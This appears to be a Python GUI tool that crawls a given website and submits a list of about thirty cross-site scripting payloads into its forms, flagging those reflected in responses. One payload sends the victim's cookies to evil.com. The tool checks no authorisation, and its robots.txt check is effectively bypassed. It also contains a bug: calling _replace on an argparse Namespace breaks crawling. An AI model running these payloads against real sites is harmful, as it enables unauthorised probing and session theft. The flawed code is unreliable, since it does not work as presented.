import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
from urllib.robotparser import RobotFileParser
from colorama import Fore, Style
import argparse
import tkinter as tk
from tkinter import scrolledtext
import threading

XSS_PAYLOADS = [
    '"><svg/onload=alert(1)>',
    '\'><svg/onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
    "<Script>alert('XSS')</scripT>",
    "<script>alert(document.cookie)</script>",
    '<script src=x onerror=alert(1)></script>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<div onmouseover=alert(1)></div>',
    '<body onload=alert(1)>',
    '<a href="javascript:alert(1)">Click me</a>',
    '<svg><script>alert(1)</script></svg>',
    '<style>@import\'http://example.com/xss.css\';</style>',
    '<link rel="stylesheet" href="http://example.com/xss.css" onload="alert(1)">',
    '<script>eval("alert(1)")</script>',
    '<script>document.write("<img src=x onerror=alert(1)>")</script>',
    '<input type="text" value="x" onfocus="alert(1)">',
    '<textarea onfocus="alert(1)">Text</textarea>',
    '<object data="javascript:alert(1)"></object>',
    '<embed src="javascript:alert(1)"></embed>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<script src="data:text/javascript,alert(1)"></script>',
    '<script>setTimeout(function(){alert(1)}, 1000);</script>',
    '<button onclick="alert(1)">Click me</button>',
    '<svg/onload="alert(1)">',
    '<img src="x" onerror="alert(1)">',
    '<style>body:before{content:"";background:url(javascript:alert(1))}</style>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<script>fetch("http://evil.com?cookie=" + document.cookie)</script>',
    '<script>location="javascript:alert(1)"</script>',
]

crawled_links = set()

def get_all_forms(url):
    try:
        soup = bs(requests.get(url).content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException:
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    
    for input in inputs:
        input_type = input["type"]
        input_name = input.get("name")
        
        if input_name:
            if input_type in ["text", "search", "textarea", "password"]:
                data[input_name] = value
            elif input_type in ["hidden", "submit"]:
                data[input_name] = input.get("value", "")

    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data)
        else:
            response = requests.get(target_url, params=data)
        
        return response if response and response.status_code == 200 else None
    except requests.exceptions.RequestException:
        return None

def scan_xss(args, scanned_urls=None):
    global crawled_links
    if scanned_urls is None:
        scanned_urls = set()
    
    if args.url in scanned_urls:
        return
    
    scanned_urls.add(args.url)
    
    forms = get_all_forms(args.url)
    
    parsed_url = urlparse(args.url)
    domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    if args.obey_robots:
        robot_parser = RobotFileParser()
        robot_parser.set_url(urljoin(domain, "/robots.txt"))
        try:
            robot_parser.read()
            crawl_allowed = robot_parser.can_fetch("*", args.url)
        except Exception:
            crawl_allowed = True
    else:
        crawl_allowed = True
    
    if crawl_allowed or parsed_url.path:
        for form in forms:
            form_details = get_form_details(form)
            form_vulnerable = False
            
            for payload in XSS_PAYLOADS:
                response = submit_form(form_details, args.url, payload)
                
                if response and payload in response.content.decode():
                    print_to_output_area(f"{Fore.GREEN}[+] XSS Vulnerability Detected on {args.url}{Style.RESET_ALL}")
                    print_to_output_area(f"[*] Form Details: {form_details}")
                    print_to_output_area(f"{Fore.YELLOW}[*] Payload: {payload} {Style.RESET_ALL}")
                    
                    if args.output:
                        with open(args.output, "a") as f:
                            f.write(f"URL: {args.url}\n")
                            f.write(f"Form Details: {form_details}\n")
                            f.write(f"Payload: {payload}\n")
                            f.write("-" * 50 + "\n\n")
                    
                    form_vulnerable = True
                else:
                    print_to_output_area(f"[-] Tested Payload: {payload} - No vulnerability found.")

            if not form_vulnerable:
                print_to_output_area(f"{Fore.MAGENTA}[-] No XSS vulnerability found on {args.url}{Style.RESET_ALL}")

    if args.crawl:
        try:
            links = get_all_links(args.url)
        except requests.exceptions.RequestException:
            links = []
        
        for link in set(links):
            if link.startswith(domain):
                crawled_links.add(link)
                if args.max_links and len(crawled_links) >= args.max_links:
                    return
                scan_xss(args._replace(url=link), scanned_urls)

def get_all_links(url):
    try:
        soup = bs(requests.get(url).content, "html.parser")
        return [urljoin(url, link.get("href")) for link in soup.find_all("a")]
    except requests.exceptions.RequestException:
        return []

def print_to_output_area(text):
    output_area.insert(tk.END, text + "\n")
    output_area.see(tk.END)

def start_scan():
    url = url_entry.get()
    max_links = int(max_links_entry.get()) if max_links_entry.get() else None
    robots = robots_checkvar.get()
    output_file = output_file_entry.get() if output_file_entry.get() else None
    
    args = argparse.Namespace(
        url=url,
        max_links=max_links,
        obey_robots=robots,
        output=output_file,
        crawl=True
    )
    
    threading.Thread(target=run_scan_and_notify, args=(args,), daemon=True).start()

def run_scan_and_notify(args):
    scan_xss(args)
    print_to_output_area("Scan finished.")

root = tk.Tk()
root.title("XSS Vulnerability Scanner")
root.configure(bg='#D9EAF5')

url_label = tk.Label(root, text="URL:", bg='#D9EAF5', fg='blue', font=('Arial', 12))
url_label.pack(pady=(10, 0))
url_entry = tk.Entry(root, width=50)
url_entry.pack(pady=(0, 10))

max_links_label = tk.Label(root, text="Max links to crawl:", bg='#D9EAF5', fg='blue', font=('Arial', 12))
max_links_label.pack(pady=(10, 0))
max_links_entry = tk.Entry(root, width=50)
max_links_entry.pack(pady=(0, 10))

robots_checkvar = tk.BooleanVar()
robots_check = tk.Checkbutton(root, text="robots?", variable=robots_checkvar, bg='#D9EAF5', fg='Red', selectcolor='#3c4043')
robots_check.pack(pady=(10, 0))

output_file_label = tk.Label(root, text="Output file:", bg='#D9EAF5', fg='blue', font=('Arial', 12))
output_file_label.pack(pady=(10, 0))
output_file_entry = tk.Entry(root, width=50)
output_file_entry.pack(pady=(0, 10))

start_button = tk.Button(root, text="Start Scan", command=start_scan, bg='#D9EAF5', fg='orange', font=('Arial', 12))
start_button.pack(pady=(10, 20))

output_area = scrolledtext.ScrolledText(root, width=80, height=20, bg='#1e1e1e', fg='white', font=('Consolas', 10))
output_area.pack(pady=(10, 20))

root.mainloop()
